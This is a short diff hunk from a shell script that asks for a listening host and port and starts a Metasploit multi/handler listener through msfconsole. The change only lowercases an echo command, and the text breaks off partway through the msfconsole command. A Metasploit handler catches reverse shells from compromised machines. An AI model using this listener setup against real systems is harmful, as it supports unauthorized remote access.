@@ -14,7 +14,7 @@ read LHOST1"
 echo "specify a listening port"
 read LPORT1
 
-ECHO "starting the listener............."
+echo "starting the listener............."
 
 msfconsole -q -x "use exploit/multi/handler;\ 
 set LHOST $LHOST1;\
